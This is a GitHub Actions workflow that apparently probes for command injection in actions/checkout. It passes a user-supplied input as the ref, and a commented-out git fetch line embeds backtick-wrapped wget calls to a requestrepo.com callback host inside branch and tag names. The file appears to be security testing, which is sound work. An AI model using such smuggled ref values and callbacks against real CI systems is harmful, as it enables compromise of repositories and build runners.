name: test checkout

on:
  workflow_dispatch:
    inputs:
      command:
        description: 'checkout'
        required: true
        default: 'main'

jobs:
  run-command:
    runs-on: [ubuntu-latest] 

    steps:
      # - name: 📤 Show Output in Summary
      #   run: /usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +refs/heads/`wget https://xtmdawk0.requestrepo.com/`*:refs/remotes/origin/`wget https://xtmdawk0.requestrepo.com/`* +refs/tags/`wget https://xtmdawk0.requestrepo.com/`*:refs/tags/`wget https://xtmdawk0.requestrepo.com/`*

      - name: Checkout
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.inputs.command }}
